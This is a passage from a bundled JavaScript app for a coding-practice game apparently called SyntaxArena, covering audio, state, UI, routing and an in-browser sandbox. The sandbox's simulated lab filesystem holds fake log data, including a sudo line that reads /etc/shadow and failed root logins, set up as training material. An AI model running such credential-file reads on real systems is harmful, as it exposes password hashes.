      // Chord 1 (Dm7): D3 (146.8), F3 (174.6), A3 (220.0), C4 (261.6)
      // Chord 2 (G7):  G2 (98.0),  F3 (174.6), B3 (246.9), D4 (293.7)
      // Chord 3 (Cmaj7): C3 (130.8), E3 (164.8), G3 (196.0), B3 (246.9)
      // Chord 4 (Am7): A2 (110.0), E3 (164.8), G3 (196.0), C4 (261.6)
      const chords = [
        [146.8, 220.0, 261.6],
        [98.0, 174.6, 246.9],
        [130.8, 196.0, 246.9],
        [110.0, 164.8, 261.6]
      ];

      const playChord = () => {
        if (!this._musicPlaying || !this._ctx || this._ctx.state === 'closed') return;
        const currentChord = chords[this._musicChordIndex % chords.length];
        this._musicChordIndex++;

        const now = this._ctx.currentTime;
        const duration = 4.0; // 4 seconds per chord cycle

        currentChord.forEach(freq => {
          try {
            const osc = this._ctx.createOscillator();
            const filter = this._ctx.createBiquadFilter();
            const gain = this._ctx.createGain();

            osc.type = 'triangle';
            osc.frequency.setValueAtTime(freq, now);

            // Gentle lowpass filter for warm, rounded ambient pad sound
            filter.type = 'lowpass';
            filter.frequency.setValueAtTime(380, now);

            // Gentle attack and release envelope
            gain.gain.setValueAtTime(0.001, now);
            gain.gain.linearRampToValueAtTime(0.18, now + 1.2);
            gain.gain.linearRampToValueAtTime(0.001, now + duration);

            osc.connect(filter);
            filter.connect(gain);
            gain.connect(this._musicGain);

            osc.start(now);
            osc.stop(now + duration + 0.1);
          } catch (_) {}
        });
      };

      // Play initial chord immediately
      playChord();

      // Loop every 3.8 seconds for smooth chord crossfade
      if (this._musicInterval) clearInterval(this._musicInterval);
      this._musicInterval = setInterval(() => {
        if (this._musicPlaying) {
          playChord();
        } else {
          clearInterval(this._musicInterval);
          this._musicInterval = null;
        }
      }, 3800);

    } catch (err) {
      console.warn('[AudioEngine] Could not start ambient music:', err);
      this._musicPlaying = false;
    }
  }

  /**
   * Stop background music smoothly.
   */
  stopMusic() {
    this._musicPlaying = false;
    if (this._musicInterval) {
      clearInterval(this._musicInterval);
      this._musicInterval = null;
    }

    if (this._musicGain && this._ctx) {
      try {
        const now = this._ctx.currentTime;
        this._musicGain.gain.setValueAtTime(this._musicGain.gain.value, now);
        this._musicGain.gain.exponentialRampToValueAtTime(0.0001, now + 0.2);
        setTimeout(() => {
          if (!this._musicPlaying && this._musicGain) {
            try {
              this._musicGain.disconnect();
            } catch (_) {}
            this._musicGain = null;
          }
        }, 250);
      } catch (_) {
        this._musicGain = null;
      }
    }
  }

  /**
   * Set music volume dynamically in real time.
   * @param {number} vol (0.0 to 1.0)
   */
  setMusicVolume(vol) {
    const safeVol = Math.max(0, Math.min(1, vol));
    if (this._musicGain && this._ctx) {
      try {
        const now = this._ctx.currentTime;
        this._musicGain.gain.setValueAtTime(safeVol * 0.12, now);
      } catch (_) {}
    }
    if (safeVol <= 0 && this._musicPlaying) {
      this.stopMusic();
    } else if (safeVol > 0 && !this._musicPlaying) {
      this.startMusic();
    }
  }
}

var AudioEngine = window.AudioEngine = new ProceduralAudioEngine();

/* --- End of js/audio.js --- */

/* --- Start of js/state.js --- */
/**
 * SyntaxArena Reactive State Store
 * Implements predictable state updates via Pub/Sub pattern.
 * Source of truth: docs/ARCHITECTURE.md
 */


class StateStore {
  constructor() {
    this._subscribers = new Map();
    this._state = {
      activeProfile: null,
      profiles: [],
      settings: {
        theme: 'dark',
        sfxVolume: 0.8,
        musicVolume: 0.5,
        reducedMotion: false
      },
      activeSession: null,
      currentPage: 'index',
      selectedLanguage: 'python',
      selectedDifficulty: 'beginner'
    };
  }

  /**
   * Initialize state from storage.
   */
  init(pageName = 'index') {
    const stored = Storage.load();
    const activeProfile = stored.profiles.find(p => p.id === stored.activeProfileId) || stored.profiles[0];

    this._state = {
      activeProfile: activeProfile ? { ...activeProfile } : null,
      profiles: [...stored.profiles],
      settings: { ...stored.settings },
      activeSession: stored.activeSession ? { ...stored.activeSession } : null,
      currentPage: pageName
    };

    return this.getState();
  }

  /**
   * Return a shallow copy of the current state.
   */
  getState() {
    return { ...this._state };
  }

  /**
   * Get a specific slice of the state.
   * @param {string} slice
   */
  get(slice) {
    return this._state[slice];
  }

  /**
   * Update a specific slice of the state predictably and notify subscribers.
   * @param {string} slice
   * @param {object|any} patch
   * @param {boolean} [persist=true] Whether to save to localStorage
   */
  set(slice, patch, persist = true) {
    if (!(slice in this._state)) {
      console.warn(`[StateStore.set] Unknown state slice: ${slice}`);
    }

    const prevSlice = this._state[slice];
    let nextSlice;

    if (patch !== null && typeof patch === 'object' && !Array.isArray(patch)) {
      nextSlice = { ...prevSlice, ...patch };
    } else {
      nextSlice = patch;
    }

    this._state[slice] = nextSlice;

    // Synchronize to localStorage if needed
    if (persist && ['activeProfile', 'profiles', 'settings', 'activeSession'].includes(slice)) {
      this._persistState();
    }

    this._notify(slice, nextSlice, prevSlice);
  }

  /**
   * Subscribe to changes on a specific state slice.
   * @param {string} slice
   * @param {Function} callback (nextValue, prevValue) => void
   * @returns {Function} Unsubscribe function
   */
  subscribe(slice, callback) {
    if (!this._subscribers.has(slice)) {
      this._subscribers.set(slice, new Set());
    }
    this._subscribers.get(slice).add(callback);
    return () => this._subscribers.get(slice).delete(callback);
  }

  /**
   * Internal notification dispatcher.
   */
  _notify(slice, nextValue, prevValue) {
    if (this._subscribers.has(slice)) {
      this._subscribers.get(slice).forEach(cb => {
        try {
          cb(nextValue, prevValue);
        } catch (err) {
          console.error(`[StateStore.notify] Error in subscriber callback for slice "${slice}":`, err);
        }
      });
    }
  }

  /**
   * Check whether persistent browser storage is currently degraded.
   * @returns {boolean}
   */
  isStorageDegraded() {
    return Boolean(Storage.isStorageDegraded);
  }

  /**
   * Commit current state back to Storage.
   * @returns {boolean} Whether write succeeded
   */
  _persistState() {
    const payload = Storage.load();
    payload.activeProfileId = this._state.activeProfile ? this._state.activeProfile.id : null;
    payload.profiles = this._state.profiles.map(p => {
      if (this._state.activeProfile && p.id === this._state.activeProfile.id) {
        return { ...this._state.activeProfile };
      }
      return p;
    });
    payload.settings = { ...this._state.settings };
    payload.activeSession = this._state.activeSession;
    return Storage.save(payload);
  }
}

var State = window.State = new StateStore();

/* --- End of js/state.js --- */

/* --- Start of js/ui.js --- */
/**
 * SyntaxArena UI Presentation Helpers
 * Reusable DOM helpers, shell bindings, accessible modals, toast notifications,
 * reduced-motion synchronizer, and counter interpolation.
 * Source of truth: docs/DESIGN_SYSTEM.md & docs/ARCHITECTURE.md & docs/BATCH_8_PLAN.md
 */





var UI = window.UI = {
  /**
   * Apply theme attribute to document root.
   * @param {'dark'|'light'|'amber'|'gold'} theme
   */
  applyTheme(theme) {
    const validThemes = ['dark', 'light', 'amber', 'gold'];
    const safeTheme = validThemes.includes(theme) ? theme : 'dark';
    document.documentElement.setAttribute('data-theme', safeTheme);
    const themeBtn = Utils.qs('#btn-theme-toggle');
    if (themeBtn) {
      themeBtn.setAttribute('aria-label', `Theme: ${safeTheme}`);
      themeBtn.setAttribute('title', `Theme: ${safeTheme}`);
      const icon = themeBtn.querySelector('use');
      if (icon) {
        icon.setAttribute('href', safeTheme === 'light' ? '#icon-moon' : '#icon-sun');
      }
    }
  },

  /**
   * Toggle between dark and light themes.
   */
  toggleTheme() {
    const currentSettings = State.get('settings') || {};
    const nextTheme = currentSettings.theme === 'light' ? 'dark' : 'light';
    State.set('settings', { theme: nextTheme });
    this.applyTheme(nextTheme);
    this.showToast(`Switched to ${nextTheme === 'light' ? 'Light (Studio Paper)' : 'Dark'} mode`, 'info');
  },

  /**
   * Synchronize reduced motion across DOM and user settings.
   * @param {boolean} [isExplicit]
   */
  applyReducedMotion(isExplicit) {
    if (typeof document === 'undefined') return;
    let shouldReduce = false;
    if (typeof isExplicit === 'boolean') {
      shouldReduce = isExplicit;
    } else {
      const settings = State.get('settings') || {};
      shouldReduce = Boolean(settings.reducedMotion);
    }

    if (shouldReduce) {
      document.documentElement.setAttribute('data-reduced-motion', 'true');
    } else {
      document.documentElement.removeAttribute('data-reduced-motion');
    }

    // Keep checkbox in sync if rendered
    const motionCheckbox = Utils.qs('#setting-reduced-motion');
    if (motionCheckbox && motionCheckbox.checked !== shouldReduce) {
      motionCheckbox.checked = shouldReduce;
    }
  },

  /**
   * Check whether motion should currently be reduced.
   * @returns {boolean}
   */
  isMotionReduced() {
    if (typeof document !== 'undefined' && document.documentElement) {
      if (document.documentElement.getAttribute('data-reduced-motion') === 'true') {
        return true;
      }
    }
    if (typeof window !== 'undefined' && window.matchMedia) {
      return window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    }
    return false;
  },

  /**
   * Animate a numeric DOM counter from start to end.
   * Immediately snaps to final value if reduced-motion is enabled.
   * @param {HTMLElement} element
   * @param {number} start
   * @param {number} end
   * @param {number} [duration=400]
   * @param {function} [formatter]
   */
  animateValue(element, start, end, duration = 400, formatter = (val) => String(Math.round(val))) {
    if (!element) return;

    if (this.isMotionReduced() || duration <= 0 || start === end) {
      element.textContent = formatter(end);
      return;
    }

    const startTime = performance.now();
    const diff = end - start;
    let lastSoundStep = -1;

    const step = (currentTime) => {
      const elapsed = currentTime - startTime;
      const progress = Math.min(elapsed / duration, 1.0);
      // Smooth ease-out cubic curve
      const easedProgress = 1 - Math.pow(1 - progress, 3);
      const currentVal = start + (diff * easedProgress);

      element.textContent = formatter(currentVal);

      // Subtle audio tick every ~10% step if moving up
      const currentStep = Math.floor(progress * 8);
      if (currentStep !== lastSoundStep && progress < 1.0) {
        lastSoundStep = currentStep;
        AudioEngine.playCount();
      }

      if (progress < 1.0) {
        requestAnimationFrame(step);
      } else {
        element.textContent = formatter(end);
      }
    };

    requestAnimationFrame(step);
  },

  /**
   * Update header profile pill to match current active profile.
   */
  updateHeaderProfile() {
    const profile = State.get('activeProfile');
    const nameEl = Utils.qs('.profile-pill .profile-name');
    const avatarEl = Utils.qs('.profile-pill .profile-avatar-mini');

    if (profile && nameEl) {
      nameEl.textContent = profile.username;
    }
    if (profile && avatarEl) {
      const avatarMeta = Profile.getAvatarMeta(profile.avatarId);
      avatarEl.innerHTML = `<img src="assets/images/${profile.avatarId || 'cyber_fox'}.svg" width="22" height="22" alt="avatar" style="border-radius: 50%;">`;
      avatarEl.setAttribute('title', `${avatarMeta.name} (Level ${profile.level})`);
    }
  },

  /**
   * Highlight the active navigation link based on current page.
   * @param {string} pageId ('index', 'game', 'results', 'progress', 'settings')
   */
  updateActiveNav(pageId) {
    const navLinks = Utils.qsa('.app-nav .nav-link');
    navLinks.forEach(link => {
      const href = link.getAttribute('href') || '';
      const isTarget = (pageId === 'index' && (href === 'index.html' || href === './')) ||
                       href.includes(`${pageId}.html`);

      if (isTarget) {
        link.setAttribute('aria-current', 'page');
      } else {
        link.removeAttribute('aria-current');
      }
    });
  },

  /**
   * Display a non-blocking toast notification.
   * @param {string} message
   * @param {'success'|'error'|'info'|'celebrate'} [type='info']
   * @param {number} [durationMs=3500]
   * @param {string} [title='']
   */
  showToast(message, type = 'info', durationMs = 3500, title = '') {
    let container = Utils.qs('.toast-container');
    if (!container) {
      container = document.createElement('div');
      container.className = 'toast-container';
      container.setAttribute('aria-live', 'polite');
      container.setAttribute('aria-atomic', 'true');
      document.body.appendChild(container);
    }

    const toast = document.createElement('div');
    toast.className = `toast toast-${type === 'celebrate' ? 'success animate-celebrate' : type}`;

    const iconSpan = document.createElement('span');
    iconSpan.style.fontSize = '1.25rem';
    iconSpan.style.flexShrink = '0';
    iconSpan.textContent = type === 'celebrate' ? '🎉' : type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ';

    const contentDiv = document.createElement('div');
    contentDiv.style.flex = '1';

    if (title) {
      const titleSpan = document.createElement('div');
      titleSpan.style.fontFamily = 'var(--font-display)';
      titleSpan.style.fontWeight = '700';
      titleSpan.style.fontSize = 'var(--text-xs)';
      titleSpan.style.letterSpacing = '0.04em';
      titleSpan.style.textTransform = 'uppercase';
      titleSpan.style.color = type === 'celebrate' ? 'var(--color-primary)' : 'var(--text-primary)';
      titleSpan.textContent = title;
      contentDiv.appendChild(titleSpan);
    }

    const textSpan = document.createElement('div');
    textSpan.style.fontSize = 'var(--text-xs)';
    textSpan.textContent = message;
    contentDiv.appendChild(textSpan);

    const closeBtn = document.createElement('button');
    closeBtn.type = 'button';
    closeBtn.setAttribute('aria-label', 'Dismiss notification');
    closeBtn.style.background = 'none';
    closeBtn.style.border = 'none';
    closeBtn.style.color = 'var(--text-muted)';
    closeBtn.style.cursor = 'pointer';
    closeBtn.style.fontSize = '1rem';
    closeBtn.style.padding = '0 var(--space-1)';
    closeBtn.textContent = '✕';
    closeBtn.onclick = () => {
      toast.classList.remove('is-visible');
      setTimeout(() => {
        if (toast.parentNode) toast.parentNode.removeChild(toast);
      }, 200);
    };

    toast.appendChild(iconSpan);
    toast.appendChild(contentDiv);
    toast.appendChild(closeBtn);
    container.appendChild(toast);

    // Trigger animation
    requestAnimationFrame(() => {
      toast.classList.add('is-visible');
    });

    // Auto cleanup
    setTimeout(() => {
      toast.classList.remove('is-visible');
      setTimeout(() => {
        if (toast.parentNode) {
          toast.parentNode.removeChild(toast);
        }
      }, 300);
    }, durationMs);
  },

  /**
   * Open an accessible modal dialog.
   * @param {string} modalId
   */
  openModal(modalId, triggerElement = null) {
    const modal = Utils.qs(`#${modalId}`);
    if (!modal) return;

    modal._triggerElement = triggerElement || document.activeElement;
    modal.classList.add('is-open');
    modal.setAttribute('aria-hidden', 'false');

    // Prevent background scrolling while modal is open
    document.body.style.overflow = 'hidden';

    // Focus first interactive element
    requestAnimationFrame(() => {
      const focusable = Array.from(modal.querySelectorAll(
        'button:not([disabled]), [href], input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
      )).filter(el => el.offsetParent !== null);
      if (focusable.length > 0) {
        focusable[0].focus();
      }
    });

    // Keyboard trap and Escape key listener
    modal._modalKeyHandler = (e) => {
      if (e.key === 'Escape') {
        e.preventDefault();
        this.closeModal(modalId);
        return;
      }
      if (e.key === 'Tab') {
        const focusable = Array.from(modal.querySelectorAll(
          'button:not([disabled]), [href], input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
        )).filter(el => el.offsetParent !== null);
        if (focusable.length === 0) return;
        const first = focusable[0];
        const last = focusable[focusable.length - 1];

        if (e.shiftKey && document.activeElement === first) {
          e.preventDefault();
          last.focus();
        } else if (!e.shiftKey && document.activeElement === last) {
          e.preventDefault();
          first.focus();
        }
      }
    };
    window.addEventListener('keydown', modal._modalKeyHandler);
  },

  /**
   * Close an accessible modal dialog.
   * @param {string} modalId
   */
  closeModal(modalId) {
    const modal = Utils.qs(`#${modalId}`);
    if (!modal) return;

    modal.classList.remove('is-open');
    modal.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';

    if (modal._modalKeyHandler) {
      window.removeEventListener('keydown', modal._modalKeyHandler);
      modal._modalKeyHandler = null;
    }

    // Restore focus to triggering control
    if (modal._triggerElement && typeof modal._triggerElement.focus === 'function') {
      try {
        modal._triggerElement.focus();
      } catch (_) {}
      modal._triggerElement = null;
    }
  },

  /**
   * Trigger celebratory confetti shower on milestones & flawless clears.
   */
  triggerConfetti() {
    if (typeof document === 'undefined') return;
    const canvas = document.createElement('canvas');
    canvas.id = 'confetti-canvas';
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    canvas.style.width = '100vw';
    canvas.style.height = '100vh';
    canvas.style.pointerEvents = 'none';
    canvas.style.zIndex = '9999';
    document.body.appendChild(canvas);

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const colors = ['#00E5FF', '#10B981', '#F59E0B', '#EF4444', '#8B5CF6', '#EC4899', '#FBBF24'];
    const particles = [];
    const count = 75;

    for (let i = 0; i < count; i++) {
      particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * (canvas.height * 0.3) - 20,
        w: Math.random() * 8 + 6,
        h: Math.random() * 6 + 4,
        color: colors[Math.floor(Math.random() * colors.length)],
        vx: (Math.random() - 0.5) * 4,
        vy: Math.random() * 3 + 2.5,
        rotation: Math.random() * 360,
        vRot: (Math.random() - 0.5) * 8,
        opacity: 1
      });
    }

    const startTime = Date.now();
    const duration = 2800;

    function render() {
      const elapsed = Date.now() - startTime;
      if (elapsed > duration) {
        if (canvas.parentNode) canvas.parentNode.removeChild(canvas);
        return;
      }

      ctx.clearRect(0, 0, canvas.width, canvas.height);
      const progress = elapsed / duration;
      const alpha = Math.max(0, 1 - progress);

      particles.forEach(p => {
        p.x += p.vx;
        p.y += p.vy;
        p.vy += 0.05; // gentle gravity
        p.rotation += p.vRot;

        ctx.save();
        ctx.globalAlpha = alpha;
        ctx.translate(p.x, p.y);
        ctx.rotate((p.rotation * Math.PI) / 180);
        ctx.fillStyle = p.color;
        ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
        ctx.restore();
      });

      requestAnimationFrame(render);
    }

    requestAnimationFrame(render);
  }
};

/* --- End of js/ui.js --- */

/* --- Start of js/router.js --- */
/**
 * SyntaxArena Router & Page Navigation Coordinator
 * Minimal multi-page routing helper supporting native browser navigation.
 * Source of truth: docs/ARCHITECTURE.md
 */


var Router = window.Router = {
  /**
   * Determine the current page identifier from DOM landmarks, data-page, or the window URL.
   * Fully robust across local file://, clean URLs, and Vercel server rewrites.
   * @returns {'index'|'game'|'results'|'progress'|'settings'}
   */
  getCurrentPage() {
    // 1. Authoritative check: data-page on body tag
    if (typeof document !== 'undefined' && document.body) {
      const bodyPage = document.body.getAttribute('data-page');
      if (bodyPage && ['index', 'game', 'results', 'progress', 'settings'].includes(bodyPage)) {
        return bodyPage;
      }
    }

    // 2. Unambiguous DOM landmark checks
    if (typeof document !== 'undefined') {
      if (document.getElementById('answer-interface-container') ||
          document.getElementById('code-terminal-container') ||
          document.getElementById('q-prompt-text') ||
          document.getElementById('gameplay-live-announcer')) {
        return 'game';
      }
      if (document.getElementById('results-progress-ring') ||
          document.getElementById('results-grade-display') ||
          document.getElementById('question-review-list')) {
        return 'results';
      }
      if (document.getElementById('trend-svg-container') ||
          document.getElementById('language-performance-grid') ||
          document.getElementById('badges-grid-container')) {
        return 'progress';
      }
      if (document.getElementById('setting-theme-dark') ||
          document.getElementById('btn-reset-account') ||
          document.getElementById('setting-reduced-motion') ||
          document.getElementById('setting-audio-sfx')) {
        return 'settings';
      }
      if (document.getElementById('language-tracks-container') ||
          document.getElementById('difficulty-cards-container') ||
          document.getElementById('hero-preview-code')) {
        return 'index';
      }
    }

    // 3. Robust URL Pathname & Clean URL Check
    if (typeof window !== 'undefined' && window.location) {
      const path = (window.location.pathname || '').toLowerCase().replace(/\/+$/, '');
      const segments = path.split('/').filter(Boolean);
      const last = segments.length > 0 ? segments[segments.length - 1] : '';
      const hash = (window.location.hash || '').toLowerCase();

      if (last === 'game' || last === 'game.html' || last === 'arena' ||
          path.endsWith('game.html') || path.endsWith('/game') || path.includes('/arena') ||
          hash.includes('/arena')) {
        return 'game';
      }

      if (last === 'results' || last === 'results.html' ||
          path.endsWith('results.html') || path.endsWith('/results') || path.includes('/results') ||
          hash.includes('/results')) {
        return 'results';
      }

      if (last === 'progress' || last === 'progress.html' || last === 'progression' ||
          path.endsWith('progress.html') || path.endsWith('/progress') || path.includes('/progression') ||
          hash.includes('/progression') || hash.includes('/progress')) {
        return 'progress';
      }

      if (last === 'settings' || last === 'settings.html' ||
          path.endsWith('settings.html') || path.endsWith('/settings') || path.includes('/settings') ||
          hash.includes('/settings')) {
        return 'settings';
      }

      if (last === 'index' || last === 'index.html' || last === 'hub' ||
          path === '' || path === '/' || hash.includes('/hub')) {
        return 'index';
      }
    }

    return 'index'; // Default fallback
  },

  /**
   * Mask the browser address bar with a UUID session path instead of raw HTML file names.
   * Preserves query parameters from window.location.search or existing hash.
   * @param {string} pageType ('index'|'game'|'results'|'progress'|'settings')
   */
  maskUrlWithUUID(pageType) {
    if (typeof window === 'undefined' || !window.history || !window.history.replaceState) return;
    try {
      const uuid = (typeof crypto !== 'undefined' && crypto.randomUUID)
        ? crypto.randomUUID()
        : `${Date.now().toString(36)}-${Math.random().toString(36).substring(2, 9)}`;

      const routeSegments = {
        index: 'hub',
        game: 'arena',
        results: 'results',
        progress: 'progression',
        settings: 'settings'
      };

      const segment = routeSegments[pageType] || 'arena';

      // Preserve search query params from window.location.search OR from existing hash
      let search = window.location.search || '';
      if (!search && window.location.hash && window.location.hash.includes('?')) {
        search = '?' + window.location.hash.split('?')[1];
      }

      const maskedUrl = `#/${segment}/${uuid}${search}`;

      window.history.replaceState({ page: pageType, uuid }, '', maskedUrl);
    } catch (_) {}
  },

  /**
   * Extract search query parameters from current URL (supports search and hash).
   * @returns {Record<string, string>}
   */
  getQueryParams() {
    const result = {};
    if (typeof window === 'undefined') return result;

    // 1. Standard URL search parameters
    if (window.location.search) {
      const params = new URLSearchParams(window.location.search);
      for (const [key, value] of params.entries()) {
        result[key.toLowerCase()] = value;
      }
    }

    // 2. Query parameters embedded inside the hash
    if (window.location.hash && window.location.hash.includes('?')) {
      const hashSearch = window.location.hash.split('?')[1];
      if (hashSearch) {
        const hashParams = new URLSearchParams(hashSearch);
        for (const [key, value] of hashParams.entries()) {
          const lowerKey = key.toLowerCase();
          if (!result[lowerKey]) {
            result[lowerKey] = value;
          }
        }
      }
    }

    return result;
  },

  /**
   * Navigate to a target page with optional query parameters.
   * @param {string} pageName ('index', 'game', 'results', 'progress', 'settings')
   * @param {Record<string, string|number>} [params={}]
   */
  navigateTo(pageName, params = {}) {
    const targetFile = pageName.endsWith('.html') ? pageName : `${pageName}.html`;
    const search = new URLSearchParams(params).toString();
    const finalUrl = search ? `${targetFile}?${search}` : targetFile;

    window.location.href = finalUrl;
  },

  /**
   * Install window beforeunload auto-save without intrusive browser dialogs.
   */
  installGuards() {
    window.addEventListener('beforeunload', () => {
      const activeSession = State.get('activeSession');
      if (activeSession && activeSession.inProgress) {
        // Quietly persist active session state without blocking the user
        try {
          State._persistState();
        } catch (_) {}
      }
    });
  }
};

/* --- End of js/router.js --- */

/* --- Start of js/sandbox-manager.js --- */
/**
 * SyntaxArena In-Browser Multi-Language Sandbox & Execution Manager
 * Zero-server, 100% client-side execution across Python, Cyber/Linux, SQL, JavaScript, and Systems Simulators.
 * Source of truth: docs/ARCHITECTURE.md
 */


// Initial Virtual Filesystem for Linux / Cyber Sandbox
function createInitialVFS() {
  return {
    '/': { type: 'dir', perms: 'rwxr-xr-x', owner: 'root' },
    '/home': { type: 'dir', perms: 'rwxr-xr-x', owner: 'root' },
    '/home/hacker': { type: 'dir', perms: 'rwxr-xr-x', owner: 'hacker' },
    '/home/hacker/notes.txt': {
      type: 'file',
      perms: 'rw-r--r--',
      owner: 'hacker',
      content: "SyntaxArena Cyber Challenge Lab\nTarget: 192.168.1.50\nObjective: Inspect logs and find the authorization flag.\nFlag: SYNTAX{b4sh_m4st3r_2026}\n"
    },
    '/home/hacker/check_string.sh': {
      type: 'file',
      perms: 'rwxr-xr-x',
      owner: 'hacker',
      content: "#!/bin/bash\nstr='SyntaxArena_2026'\nif [[ $str == *Arena* ]]; then\n  echo 'MATCH'\nelse\n  echo 'NO'\nfi\n"
    },
    '/home/hacker/exploit.py': {
      type: 'file',
      perms: 'rwxr-xr-x',
      owner: 'hacker',
      content: "import sys\nprint('Testing payload length:', len('SyntaxArena'))\n"
    },
    '/etc': { type: 'dir', perms: 'rwxr-xr-x', owner: 'root' },
    '/etc/passwd': {
      type: 'file',
      perms: 'rw-r--r--',
      owner: 'root',
      content: "root:x:0:0:root:/root:/bin/bash\nhacker:x:1000:1000:Hacker:/home/hacker:/bin/bash\nguest:x:1001:1001:Guest:/home/guest:/bin/sh\n"
    },
    '/etc/hosts': {
      type: 'file',
      perms: 'rw-r--r--',
      owner: 'root',
      content: "127.0.0.1 localhost\n192.168.1.1 gateway.local\n192.168.1.50 target.syntaxarena.internal\n"
    },
    '/var': { type: 'dir', perms: 'rwxr-xr-x', owner: 'root' },
    '/var/log': { type: 'dir', perms: 'rwxr-xr-x', owner: 'root' },
    '/var/log/auth.log': {
      type: 'file',
      perms: 'rw-r-----',
      owner: 'root',
      content: "Oct 22 03:00:01 srv sshd[1240]: Accepted publickey for hacker from 192.168.1.10 port 49202\nOct 22 03:05:12 srv sshd[1380]: Failed password for invalid user admin from 10.0.0.99\nOct 22 03:05:14 srv sshd[1382]: Failed password for invalid user root from 10.0.0.99\nOct 22 03:05:18 srv sshd[1385]: Failed password for invalid user oracle from 10.0.0.99\nOct 22 03:10:00 srv sudo[1420]: hacker : TTY=pts/0 ; PWD=/home/hacker ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
    },
    '/tmp': { type: 'dir', perms: 'rwxrwxrwt', owner: 'root' }
  };
}

// Initial In-Memory Relational Database for SQL Sandbox
function createInitialDB() {
  return {
    users: [
      { id: 1, username: 'neo_coder', role: 'admin', email: 'neo@matrix.io', xp: 4500, active: 1 },
      { id: 2, username: 'script_kiddie', role: 'member', email: 'kiddie@arena.io', xp: 850, active: 1 },
      { id: 3, username: 'cyber_ghost', role: 'analyst', email: 'ghost@vault.dev', xp: 2100, active: 1 },
      { id: 4, username: 'algo_queen', role: 'member', email: 'queen@algo.org', xp: 3200, active: 1 },
      { id: 5, username: 'syntax_fox', role: 'guest', email: 'fox@demo.net', xp: 120, active: 0 }
    ],
    audit_logs: [
      { id: 101, user_id: 1, action: 'LOGIN_SUCCESS', ip: '192.168.1.10', status: '200 OK', created_at: '2026-10-22 02:00' },
      { id: 102, user_id: 3, action: 'FILE_READ', ip: '192.168.1.50', status: '200 OK', created_at: '2026-10-22 02:15' },
      { id: 103, user_id: 2, action: 'AUTH_FAILED', ip: '10.0.0.99', status: '401 UNAUTHORIZED', created_at: '2026-10-22 02:30' },
      { id: 104, user_id: 4, action: 'STAGE_CLEAR', ip: '192.168.1.22', status: '200 OK', created_at: '2026-10-22 02:45' },
      { id: 105, user_id: 1, action: 'CONFIG_UPDATE', ip: '192.168.1.10', status: '200 OK', created_at: '2026-10-22 03:00' }
    ],
    challenges: [
      { id: 201, track: 'python', difficulty: 'beginner', points: 100, title: 'List Slicing Quirks' },
      { id: 202, track: 'c', difficulty: 'intermediate', points: 250, title: 'Pointer Arithmetic' },
      { id: 203, track: 'cyber', difficulty: 'beginner', points: 150, title: 'Bash Wildcard Pattern Matching' },
      { id: 204, track: 'sql', difficulty: 'beginner', points: 100, title: 'GROUP BY Aggregations' },
      { id: 205, track: 'rust', difficulty: 'expert', points: 400, title: 'Lifetimes & Borrow Checker' }
    ]
  };
}

var SandboxManager = window.SandboxManager = {
  isLoaded: false,
  isLoading: false,
  loadPromise: null,

  // Linux Virtual Terminal State
  vfs: createInitialVFS(),
  currentDir: '/home/hacker',
  envVars: {
    USER: 'hacker',
    HOME: '/home/hacker',
    SHELL: '/bin/bash',
    PATH: '/usr/local/bin:/usr/bin:/bin',
    PWD: '/home/hacker'
  },

  // SQL In-Memory Database State
  db: createInitialDB(),

  /**
   * Reset Virtual Linux Filesystem to factory defaults.
   */
  resetLinuxVFS() {
    this.vfs = createInitialVFS();
    this.currentDir = '/home/hacker';
    this.envVars.PWD = '/home/hacker';
  },

  /**
   * Reset SQL In-Memory DB to factory defaults.
   */
  resetSQLDB() {
    this.db = createInitialDB();
  },

  /**
   * Ensure Skulpt Python engine is loaded in the page.
   * @returns {Promise<boolean>}
   */
  async ensureEngine() {
    if (typeof window !== 'undefined' && window.Sk && window.Sk.importMainWithBody) {
      this.isLoaded = true;
      return true;
    }

    if (this.loadPromise) {
      return this.loadPromise;
    }

    this.isLoading = true;
    this.loadPromise = new Promise((resolve) => {
      const loadScript = (src) => {
        return new Promise((res, rej) => {
          const s = document.createElement('script');
          s.src = src;
          s.async = false;
          s.onload = () => res();
          s.onerror = (e) => {
            console.warn(`[SandboxManager] Local script ${src} failed. Loading fallback...`, e);
            const cdnSrc = src.includes('stdlib')
              ? 'https://cdn.jsdelivr.net/npm/skulpt@1.2.0/dist/skulpt-stdlib.js'
              : 'https://cdn.jsdelivr.net/npm/skulpt@1.2.0/dist/skulpt.min.js';
            const sCdn = document.createElement('script');
            sCdn.src = cdnSrc;
            sCdn.async = false;
            sCdn.onload = () => res();
            sCdn.onerror = (err) => rej(err);
            document.head.appendChild(sCdn);
          };
          document.head.appendChild(s);
        });
      };

      loadScript('assets/vendor/skulpt.min.js')
        .then(() => loadScript('assets/vendor/skulpt-stdlib.js'))
        .then(() => {
          this.isLoaded = true;
          this.isLoading = false;
          console.log('[SandboxManager] Client-side Python 3 engine initialized successfully.');
          resolve(true);
        })
        .catch(err => {
          console.error('[SandboxManager] Failed to initialize Python engine:', err);
          this.isLoading = false;
          resolve(false);
        });
    });

    return this.loadPromise;
  },

  /**
   * Execute Python code safely with 3-second timeout and stdout capture.
   * @param {string} code
   * @param {number} [timeoutMs=3500]
   * @returns {Promise<{ success: boolean, output: string, error?: string, elapsedMs: number }>}
   */
  async runPython(code, timeoutMs = 3500) {
    const ready = await this.ensureEngine();
    if (!ready || typeof window.Sk === 'undefined') {
      return {
        success: false,
        output: '',
        error: 'Python engine is currently unavailable. Check your internet connection or asset files.',
        elapsedMs: 0
      };
    }

    const trimmed = (code || '').trim();
    if (!trimmed) {
      return {
        success: true,
        output: '(No code provided to execute.)',
        elapsedMs: 0
      };
    }

    let stdoutBuffer = '';
    const start = performance.now();

    window.Sk.configure({
      output: (text) => {
        stdoutBuffer += text;
      },
      read: (filename) => {
        if (window.Sk.builtinFiles === undefined || window.Sk.builtinFiles['files'][filename] === undefined) {
          throw new Error(`File not found: '${filename}'`);
        }
